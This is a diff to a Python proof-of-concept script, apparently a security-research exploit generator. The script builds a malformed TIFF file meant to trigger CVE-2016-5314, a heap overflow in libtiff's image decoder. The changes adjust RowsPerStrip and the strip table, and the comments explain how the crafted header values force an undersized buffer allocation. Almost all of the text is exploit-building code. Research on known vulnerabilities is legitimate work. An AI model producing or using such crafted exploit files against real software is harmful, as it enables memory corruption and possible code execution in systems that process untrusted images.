@@ -9,10 +9,11 @@ def build_poc():
     raw_uncompressed_attack = b"A" * 1000
     zlib_payload = zlib.compress(raw_uncompressed_attack)
 
-    # To reproduce CVE-2016-5314 correctly, we want RowsPerStrip=0xFFFFFFFF (overflow to tiny alloc)
-    # and ImageLength=10. This forces the decoder to allocate an undersized tbuf but use full-line output.
-    # 1 strip should be enough because ImageLength < RowsPerStrip.
-    num_strips = 1
+    # To reproduce CVE-2016-5314 correctly, we want RowsPerStrip=1 and ImageLength=10
+    # (small alloc) while letting decompression use the full image trust length.
+    # 10 strips are required (imageLength/rowsPerStrip), so we build a strip table
+    # with 10 offsets and byte counts, each pointing to a valid compressed strip.
+    num_strips = 10
 
     # Build IFD entries; strip arrays will be stored after IFD.
     entries = [
@@ -40,7 +41,7 @@ def build_poc():
         (262, 3, 1, 1),             # PhotometricInterpretation: BlackIsZero
         (273, 4, num_strips, strip_offsets_offset),
         (277, 3, 1, 1),             # SamplesPerPixel: 1
-        (278, 4, 1, 0xFFFFFFFF),    # RowsPerStrip: 0xFFFFFFFF (overflow)
+        (278, 4, 1, 1),             # RowsPerStrip: 1
         (279, 4, num_strips, strip_bytecounts_offset)
     ]
 
